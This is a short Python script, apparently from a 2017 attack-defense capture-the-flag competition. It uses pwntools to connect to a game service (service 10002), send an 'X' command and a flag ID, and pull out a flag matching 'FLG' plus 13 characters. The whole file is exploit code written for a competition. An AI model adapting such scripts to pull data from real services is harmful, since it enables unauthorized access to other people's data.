#########################
## Connor Nelson, 2017 ##
#########################

import re

from pwn import *

TIMEOUT = 2.0

def exploit_info():
    info = {}
    info['exploit_function'] = exploit
    info['service_id'] = 10002
    return info

def exploit(remote, flag_id):
    remote.recv(timeout=TIMEOUT)
    remote.write("X\n")
    remote.recv(timeout=TIMEOUT)
    remote.write(flag_id + "\n")
    flag_response = remote.recv(timeout=TIMEOUT)
    match = re.search(r'FLG.{13}', flag_response)
    if match:
        return match.group(0)
